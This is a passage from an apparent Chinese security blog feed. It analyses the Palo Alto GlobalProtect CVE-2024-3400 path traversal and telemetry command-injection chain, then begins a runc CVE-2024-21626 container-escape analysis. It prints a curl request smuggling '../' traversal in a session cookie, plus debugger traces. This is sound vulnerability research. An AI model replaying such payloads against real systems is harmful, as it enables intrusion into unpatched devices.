github.com&#x2F;gorilla&#x2F;sessions.(*Registry).Get (s&#x3D;0xc00c1a6a60, store&#x3D;..., name&#x3D;..., session&#x3D;0x0, err&#x3D;...)</span><br><span class="line">    at &#x2F;opt&#x2F;build&#x2F;bamboo-agent-home-3&#x2F;xml-data&#x2F;build-dir&#x2F;LA-GPSVC131-JOB1&#x2F;build&#x2F;src&#x2F;3p&#x2F;pkg&#x2F;mod&#x2F;github.com&#x2F;gorilla&#x2F;sessions@v1.2.1&#x2F;sessions.go:139</span><br><span class="line">#2  0x0000000000aee55d in main.(*SessDiskStore).Get (s&#x3D;0xc000821800, r&#x3D;0xc00260f400, name&#x3D;..., ~r2&#x3D;0x0, ~r3&#x3D;...)</span><br><span class="line">    at &#x2F;opt&#x2F;build&#x2F;bamboo-agent-home-3&#x2F;xml-data&#x2F;build-dir&#x2F;LA-GPSVC131-JOB1&#x2F;build&#x2F;src&#x2F;apps&#x2F;pan_gpsvc_session.go:87</span><br><span class="line">#3  0x0000000000af606a in main.(*GpTask).initHttp (t&#x3D;0xc00725eb00, r&#x3D;0xc00260f400, ~r1&#x3D;...)</span><br><span class="line">    at &#x2F;opt&#x2F;build&#x2F;bamboo-agent-home-3&#x2F;xml-data&#x2F;build-dir&#x2F;LA-GPSVC131-JOB1&#x2F;build&#x2F;src&#x2F;apps&#x2F;pan_gpsvc_task.go:442</span><br><span class="line">#4  0x0000000000afd0a9 in main.(*GpTask).RunHttp (t&#x3D;0xc00725eb00, w&#x3D;..., r&#x3D;0xc00260f400, ~r2&#x3D;false)</span><br><span class="line">    at &#x2F;opt&#x2F;build&#x2F;bamboo-agent-home-3&#x2F;xml-data&#x2F;build-dir&#x2F;LA-GPSVC131-JOB1&#x2F;build&#x2F;src&#x2F;apps&#x2F;pan_gpsvc_task.go:802</span><br><span class="line">#5  0x0000000000b10b48 in main.(*GpTaskMgmt).MainHttpEntry (tm&#x3D;0xc000870000, w&#x3D;..., r&#x3D;0xc00260f300)</span><br><span class="line">    at &#x2F;opt&#x2F;build&#x2F;bamboo-agent-home-3&#x2F;xml-data&#x2F;build-dir&#x2F;LA-GPSVC131-JOB1&#x2F;build&#x2F;src&#x2F;apps&#x2F;pan_gpsvc_taskmgmt.go:450</span><br><span class="line">#6  0x0000000000b3aadd in main.(*GpTaskMgmt).MainHttpEntry-fm (w&#x3D;..., r&#x3D;0xc00260f300)</span><br><span class="line">    at &#x2F;opt&#x2F;build&#x2F;bamboo-agent-home-3&#x2F;xml-data&#x2F;build-dir&#x2F;LA-GPSVC131-JOB1&#x2F;build&#x2F;src&#x2F;apps&#x2F;pan_gpsvc_taskmgmt.go:406</span><br><span class="line">#7  0x0000000000867f74 in net&#x2F;http.HandlerFunc.ServeHTTP (f&#x3D;&#123;void (net&#x2F;http.ResponseWriter, net&#x2F;http.Request *)&#125; 0xc00c2077a8, w&#x3D;..., r&#x3D;0xc00260f300)</span><br><span class="line">    at &#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;net&#x2F;http&#x2F;server.go:2036</span><br><span class="line">#8  0x0000000000a78e56 in github.com&#x2F;gorilla&#x2F;mux.(*Router).ServeHTTP (r&#x3D;0xc0006c20c0, w&#x3D;..., req&#x3D;0xc00260f300)</span><br><span class="line">    at &#x2F;opt&#x2F;build&#x2F;bamboo-agent-home-3&#x2F;xml-data&#x2F;build-dir&#x2F;LA-GPSVC131-JOB1&#x2F;build&#x2F;src&#x2F;3p&#x2F;pkg&#x2F;mod&#x2F;github.com&#x2F;gorilla&#x2F;mux@v1.7.4&#x2F;mux.go:210</span><br><span class="line">#9  0x000000000086c7df in net&#x2F;http.serverHandler.ServeHTTP (sh&#x3D;..., rw&#x3D;..., req&#x3D;0xc00260f100) at &#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;net&#x2F;http&#x2F;server.go:2831</span><br><span class="line">#10 0x0000000000866f1a in net&#x2F;http.(*conn).serve (c&#x3D;0xc0081981e0, ctx&#x3D;...) at &#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;net&#x2F;http&#x2F;server.go:1919</span><br><span class="line">#11 0x0000000000467411 in runtime.goexit () at &#x2F;usr&#x2F;local&#x2F;go&#x2F;src&#x2F;runtime&#x2F;asm_amd64.s:1357</span><br><span class="line">#12 0x000000c0081981e0 in ?? ()</span><br><span class="line">#13 0x0000000000d79060 in ?? ()</span><br><span class="line">#14 0x000000c00c150680 in ?? ()</span><br><span class="line">#15 0x0000000000000000 in ?? ()</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-c3130bc4796598411944674097931770-14cb43.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-c3130bc4796598411944674097931770-14cb43.png" alt="image.png"></a></p><p>此时可以看到 <code>$rdi-&gt;array</code> 存储了我们的 payload 的相关字符： <code>session_/../../../tmp/hacked</code>， 我们单步走一步走到调用<code>main_loadSessFile</code> 函数的位置</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-59f7c68a52093fe1078a3c3ce66597b3-700c7a.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-59f7c68a52093fe1078a3c3ce66597b3-700c7a.png" alt="image.png"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-89773aaf9d064cd1db4a91f64b02edb8-ea0f0e.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-89773aaf9d064cd1db4a91f64b02edb8-ea0f0e.png" alt="image.png"></a></p><p>(分析到这，我突然反应过来他是golang 是旧版本的 api 调用 ， 搜了下字符串可以知道他的 golang 版本是 1.13.15)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000C956F6 aGo11315        db &#39;go1.13.15&#39;  </span><br></pre></td></tr></table></figure><p>可以看到 <code>/../</code> 相关字符被<code>path_filepath_Join</code>函数处理后已经被去除了，问题来了， 是在哪创建的的文件呢？</p><p>我们找到 <code>syscall_Open</code> 函数 ， 对其进行引用查找， 找到一条这样的调用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main_loadSessFile-&gt;main_fileLock-&gt;syscall_Open</span><br></pre></td></tr></table></figure><p>而此时 <code>main_loadSessFile</code> 的参数就是我们想要创建的文件</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-235249db9a3c7fa42c43db517cce1ff8-4555d5.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-235249db9a3c7fa42c43db517cce1ff8-4555d5.png" alt="image.png"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-068b2775458e708e5e942d9156ca3921-a625c6.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-068b2775458e708e5e942d9156ca3921-a625c6.png" alt="image.png"></a></p><p>open 的定义为 <code>int open(const char *pathname, int flags, mode_t mode);</code>  第二个参数是个 flags， 当值为 0x40 的时候为 <code>O_CREAT</code> </p><p><code>O_CREAT</code> 定义位于 <code>fcntl.h</code> 文件中， 可以在 linux  的内核代码<sup id="fnref:4"><a href="#fn:4" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="fcntl.h#24 https://elixir.bootlin.com/linux/latest/source/include/uapi/asm-generic/fcntl.h#L24">[4]</span></a></sup>中看到, </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_ACCMODE00000003</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDONLY00000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_WRONLY00000001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDWR00000002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> O_CREAT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_CREAT00000100<span class="comment">/* not fcntl */</span></span></span><br></pre></td></tr></table></figure><p><code>O_CREAT</code> 的值通常是 0100，这是一个八进制表示的值， 等同于十进制的 64 ，十六进制的 0x40， 通过查找相关资料<sup id="fnref:5"><a href="#fn:5" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="device-telemetry-overview https://docs.paloaltonetworks.com/pan-os/11-0/pan-os-admin/device-telemetry/device-telemetry-overview">[5]</span></a></sup></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-3ffee6673ab5634330e66291a37c3cd3-b0a3d1.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-3ffee6673ab5634330e66291a37c3cd3-b0a3d1.png" alt="image.png"></a><br>发现只有文件不存在的时候才会创建文件。</p><p>例如使用如下 payload 尝试创建 <code>/etc/passwd</code> 的时候</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -i -s -k -X $<span class="string">&#x27;POST&#x27;</span> \</span><br><span class="line">    -H $<span class="string">&#x27;Host: 127.0.0.1&#x27;</span> -H $<span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -H $<span class="string">&#x27;Content-Length: 158&#x27;</span> \</span><br><span class="line">    -b $<span class="string">&#x27;SESSID=/../../../etc/passwd&#x27;</span> \</span><br><span class="line">    --data-binary $<span class="string">&#x27;user=watchTowr&amp;portal=watchTowr&amp;authcookie=e51140e4-4ee3-4ced-9373-96160d68&amp;domain=watchTowr&amp;computer=watchTowr&amp;client-ip=watchTowr&amp;client-ipv6=watchTowr&amp;md5-sum=watchTowr&amp;gwHipReportCheck=watchTowr&#x27;</span> \</span><br><span class="line">    $<span class="string">&#x27;https://192.168.1.101/ssl-vpn/hipreport.esp&#x27;</span></span><br></pre></td></tr></table></figure><p>可以看到 open 是返回了 0 </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-810d6dcabac9dcf51657ac71a5d47f4d-80955e.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-810d6dcabac9dcf51657ac71a5d47f4d-80955e.png" alt="image.png"></a></p><p>这个漏洞会创建一个任意路径、文件名可控的文件（不能覆盖文件）。那么攻击者是如何将这么一个漏洞再组合成一个命令执行的呢？ 这就得提到 <code>telemetry</code> 功能了</p><h3 id="telemetry-命令文件分析"><a href="#telemetry-命令文件分析" class="headerlink" title="telemetry 命令文件分析"></a>telemetry 命令文件分析</h3><p>根据官网 <sup id="fnref:5"><a href="#fn:5" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="device-telemetry-overview https://docs.paloaltonetworks.com/pan-os/11-0/pan-os-admin/device-telemetry/device-telemetry-overview">[5]</span></a></sup> 的介绍， 该功能是一个定时发送数据到远端的一个功能,  在<a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">环境搭建</a>提到的该功能开启需要一个设备证书， 我目前的复现环境是不支持的。 只能分析分析功能了</p><p>在 <code>/etc/cron.d</code> 可以看到很多和 <code>telemetry</code> 相关的定时任务</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-4bb202089b4a73d0064f49ebaec4c644-72d69e.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-4bb202089b4a73d0064f49ebaec4c644-72d69e.png" alt="image.png"></a></p><p>其中 <code>/usr/local/bin/dt_send</code> 看起来是用来发送数据的</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-beb3256ebdbcd91ec7e907e49421a64d-40a708.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-beb3256ebdbcd91ec7e907e49421a64d-40a708.png" alt="image.png"></a></p><p>该程序由 python 编写， 可以看到简单判断了下功能是不是开启， 然后调用 <code>check_and_send</code> 函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-baf3b2ecaee060425c72fc2615b59415-ed0e89.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-baf3b2ecaee060425c72fc2615b59415-ed0e89.png" alt="image.png"></a></p><p><code>check_and_send</code> 函数会接着调用 <code>send_file_dirs_all</code> </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-61fcdcf46d6b2396b8da726384d11552-ddf408.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-61fcdcf46d6b2396b8da726384d11552-ddf408.png" alt="image.png"></a></p><p>可以看到 <code>send_file_dirs_all</code> 函数会遍历 <code>DEFAULT_DEVTELEM_OUTPUT_DIR</code> 下的文件， 然后再调用 <code>send_file_dir</code> </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-c01c5fe824a5a8132224e7c94455616a-3c0a70.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-c01c5fe824a5a8132224e7c94455616a-3c0a70.png" alt="image.png"></a></p><p>而在 <code>send_file_dir</code> 函数中， 用 <code>send_file</code> 函数<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-8994297e731d707b99b8a4225c122839-d98bd2.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-8994297e731d707b99b8a4225c122839-d98bd2.png" alt="image.png"></a></p><p>在 <code>send_file</code> 函数中， 会将文件名拼接到 <code>send_file_cmd</code> 遍历中</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-24cf5f7a5735b831a73de98d2846873d-1614c6.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-24cf5f7a5735b831a73de98d2846873d-1614c6.png" alt="image.png"></a></p><p>接着调用 <code>cmd_status = techsupport.dosys(send_file_cmd, None)</code>  ， 运行 <code>dt_curl</code> 命令， 该命令也是一个 python 程序，</p><p><code>dt_curl</code> 里会调用 <code>send_file</code> 函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-08b3e2becbc3edfd994398a2edd38add-7e0dd9.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-08b3e2becbc3edfd994398a2edd38add-7e0dd9.png" alt="image.png"></a></p><p>在该函数中就拼接命令， 使用 <code>pansys(curl_cmd, shell=True, timeout=250)</code> 函数调用， 注意这里的 <code>shell=True</code></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-f58b2a103617bdae4fef7db22a735866-c28f61.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-f58b2a103617bdae4fef7db22a735866-c28f61.png" alt="image.png"></a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-2a92589d19818391108f9d06d1b68567-103079.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-2a92589d19818391108f9d06d1b68567-103079.png" alt="image.png"></a></p><p>这里最后调用到 <code>/opt/plugins/2.0/python-lib/pan/pansys/pansys.py</code> 文件中的 <code>dosys</code> </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-0c59c65d1d72c9a776c8a0e654f16be5-204ca2.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-0c59c65d1d72c9a776c8a0e654f16be5-204ca2.png" alt="image.png"></a></p><p>可以看到这里的<code>shell</code>参数默认是 False 的 但是由于<code>send_file</code> 调用的是传递进来设置了成了 True, 因此可以命令注入 。</p><h2 id="Diff-Patch"><a href="#Diff-Patch" class="headerlink" title="Diff Patch"></a>Diff Patch</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-87ab1a33c8d1965d00965b2e9812a345-b382a9.png" title="image-20240420215633491" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-87ab1a33c8d1965d00965b2e9812a345-b382a9.png" alt="image-20240420215633491"></a></p><p>新增了个 seesion 检查函数？<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-9e5d5bfab12dae37621d242a6140f984-863fea.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-9e5d5bfab12dae37621d242a6140f984-863fea.png" alt="image.png"></a></p><p>从日志可以可以看到似乎加了检查 <code>&#123;&quot;level&quot;:&quot;error&quot;,&quot;task&quot;:&quot;3-22&quot;,&quot;time&quot;:&quot;2024-04-20T06:28:12.18264473-07:00&quot;,&quot;message&quot;:&quot;ArgFilterCheck: authcookie input is invalid&quot;&#125;</code></p><p>刚好也是这个补丁加的样子， 从编译路径来看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) bt</span><br><span class="line">#0  main.(*GpTask).ArgFilterCheck (t&#x3D;0xc000093080, filterName&#x3D;..., argName&#x3D;..., value&#x3D;..., ~r3&#x3D;9)</span><br><span class="line">    at &#x2F;opt&#x2F;build&#x2F;workspace&#x2F;NOMAD&#x2F;89c94875&#x2F;workspace&#x2F;ations_gpsvc_hotfix_10.2.9-hf-ga&#x2F;src&#x2F;apps&#x2F;pan_gpsvc_task.go:615</span><br><span class="line">#1  0x0000000000afb593 in main.(*GpTask).ArgFilterCheckUser (t&#x3D;0xc000093080, value&#x3D;..., ~r1&#x3D;0)</span><br></pre></td></tr></table></figure><p>修复了 <code>shell=True</code> 的问题<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-7f796cd138c057404a155dab809835d8-16411b.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-7f796cd138c057404a155dab809835d8-16411b.png" alt="image.png"></a></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>一个空文件创建到命令执行， 想必这个攻击者估计找这个功能了找了不少时间吧，此外该漏洞的利用目前需要开启<code>telemetry</code> 功能， 那么是否还有可以利用这个空文件创建的地方呢？ 这么大的一个系统也许还有吧， 有时间可以在仔细看看</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-fc42bf5ea0492ff89c8787de7a5d14b0-573b7f.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-04-20-fc42bf5ea0492ff89c8787de7a5d14b0-573b7f.png" alt="image.png"></a></p><h2 id="Reference-link"><a href="#Reference-link" class="headerlink" title="Reference link"></a>Reference link</h2><div id="footnotes"><hr><div id="footnotelist"><ol style="list-style: none; padding-left: 0; margin-left: 40px"><li id="fn:1"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">1.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">CVE-2024-3400 https://security.paloaltonetworks.com/CVE-2024-3400<a href="#fnref:1" rev="footnote"> ↩</a></span></li><li id="fn:2"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">2.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400 https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/<a href="#fnref:2" rev="footnote"> ↩</a></span></li><li id="fn:3"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">3.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">Larryxi blog https://aslr.io/about/<a href="#fnref:3" rev="footnote"> ↩</a></span></li><li id="fn:4"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">4.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">fcntl.h#24 https://elixir.bootlin.com/linux/latest/source/include/uapi/asm-generic/fcntl.h#L24<a href="#fnref:4" rev="footnote"> ↩</a></span></li><li id="fn:5"><span style="display: inline-block; vertical-align: top; padding-right: 10px; margin-left: -40px">5.</span><span style="display: inline-block; vertical-align: top; margin-left: 10px;">device-telemetry-overview https://docs.paloaltonetworks.com/pan-os/11-0/pan-os-admin/device-telemetry/device-telemetry-overview<a href="#fnref:5" rev="footnote"> ↩</a></span></li></ol></div></div></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; hr</summary>
      
    
    
    
    
    <category term="CVE-2024-3400" scheme="https://bestwing.me/tags/CVE-2024-3400/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-21626 容器逃逸漏洞分析</title>
    <link href="https://bestwing.me/CVE-2024-21626-container-escape.html"/>
    <id>https://bestwing.me/CVE-2024-21626-container-escape.html</id>
    <published>2024-02-01T08:18:59.000Z</published>
    <updated>2024-02-03T08:11:09.781Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>最近公开了一个 runc 容器逃逸的<a href="https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv">公告</a>, 从公告看漏洞影响范围是： <code>&gt;=v1.0.0-rc93,&lt;=1.1.11</code> , 补丁版本为： 1.1.12， 这里我的复现版本是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ pwnable in ~ [16:27:23]</span></span><br><span class="line">$ docker info | grep <span class="string">&quot;runc&quot;</span></span><br><span class="line"> Runtimes: io.containerd.runc.v2 runc</span><br><span class="line"> Default Runtime: runc</span><br><span class="line"> runc version: v1.1.7-0-g860f061</span><br></pre></td></tr></table></figure><p>于是我和 @explorer 以及 @leommxj 一起简单看了一下。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从公告讲就是 <code>runc run</code> 或者 <code>runc exec</code> 的过程中有存在没有及时关闭的 <code>fd</code> ，导致文件描述符泄漏在容器环境中，用户可以通过这个文件描述来进行容器逃逸。</p><p>首先来做一个赛博考古， 公告提到该漏洞是在 <code>v1.0.0-rc93</code> 这个版本引入的，在这个版本找到了两个打开 cgroup 地方。</p><p>一处是在这个 <a href="https://github.com/opencontainers/runc/commit/fad92bbffa9c13652c07f1966606089e28442a87">commit </a> 中，在 <code>(m *manager) Apply(pid int) (err error) </code> 函数中加载了 cgroup ， 然后在 <code>func (p *initProcess) start()</code> 函数里调用到了。具体文件行号为 fs.go:339</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err := p.manager.Apply(p.pid()); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> newSystemErrorWithCause(err, <span class="string">&quot;applying cgroup configuration for process&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-dfd0b187a7a90ee33fe0907ee0221b6a-9f4d04.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-dfd0b187a7a90ee33fe0907ee0221b6a-9f4d04.png" alt="image.png"></a></p><p>此处在rc93 这个版本 release 的。</p><p>2月2日，我对blog更新了如下<a href="https://bestwing.me/CVE-2024-21626-container-escape.html#update-2024-2-2">内容</a>, 基本可以判断泄漏 fd 的地方就是在 这个 commit 引入的了。</p><p>首先我们在runc代码的 <code>file.go</code> 代码中，假设有这么一个调用链： （并不是所有的 <code>OpenFile</code> 函数都会是 <code>ReadFIle</code> 调用）</p><p><code>ReadFile</code> -&gt; <code>OpenFile</code>-&gt; <code>openFile</code> -&gt; <code>prepareOpenat2</code> </p><p>而在次新版本（未更添加补丁的）的代码中 ，即从这个 <a href="https://github.com/opencontainers/runc/commit/2a4ed3e75b9e80d93d1836a9c4c1ebfa2b78870e">commit</a> 中可以看出是因为 <code>prepareOpenat2</code> 函数是在检查<code>openat2</code> 这个syscall 是不是能被正常调用，如果调用失败， 则进到 <code>openFallback</code> 函数中，如果成功则用后续使用 <code>unix.Openat2</code> 打开 <code>/sys/fs/cgroup</code> ，此处的 <code>unix.Openat2</code> 是有 <code>O_CLOEXEC</code> flag的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://github.com/opencontainers/runc/blob/2a4ed3e75b9e80d93d1836a9c4c1ebfa2b78870e/libcontainer/cgroups/file.go#L127</span></span><br><span class="line">path := path.Join(dir, utils.CleanPath(file))</span><br><span class="line"><span class="keyword">if</span> prepareOpenat2() != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> openFallback(path, flags, mode)</span><br><span class="line">&#125;</span><br><span class="line">relPath := strings.TrimPrefix(path, cgroupfsPrefix)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(relPath) == <span class="built_in">len</span>(path) &#123; <span class="comment">// non-standard path, old system?</span></span><br><span class="line"><span class="keyword">return</span> openFallback(path, flags, mode)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fd, err := unix.Openat2(<span class="keyword">int</span>(cgroupRootHandle.Fd()), relPath,</span><br><span class="line">&amp;unix.OpenHow&#123;</span><br><span class="line">Resolve: resolveFlags,</span><br><span class="line">Flags:   <span class="keyword">uint64</span>(flags) | unix.O_CLOEXEC,</span><br><span class="line">Mode:    <span class="keyword">uint64</span>(mode),</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后如果 <code>prepareOpenat2</code>成功打开了 <code>/sys/fs/cgroup</code>， 则此时必有一个 fd 指向了 <code>/sys/fs/cgroup</code> 文件夹，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-3d247d8ab3a957ac8360bb6ab274bc26-0d73a8.png" title="image.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2024-02-01-3d247d8ab3a957ac8360bb6ab274bc26-0d73a8.png" alt="image.png"></a></p><p> 可以从图上的这个补丁看出来，  <code>prepareOpenat2</code> 函数内打开这个文件夹的时候也没有用 <code>O_CLOEXEC</code> 这个标志。而且 <code>prepareOpenat2</code>函数内也并没有 close 掉这个这个 fd，且这个 fd 并没有通过 <code>prepareOpenat2</code> 函数返回, 因为如果能将这个 fd 返回话，在<code>ReadFile</code> 或者 <code>WriteFile</code> 中（或者其他函数），会通过  <code>defer fd.Close()</code> 这样的方法来关闭这个 fd 。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ReadFile</span><span class="params">(dir, file <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">fd, err := OpenFile(dir, file, unix.O_RDONLY)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fd.Close()</span><br><span 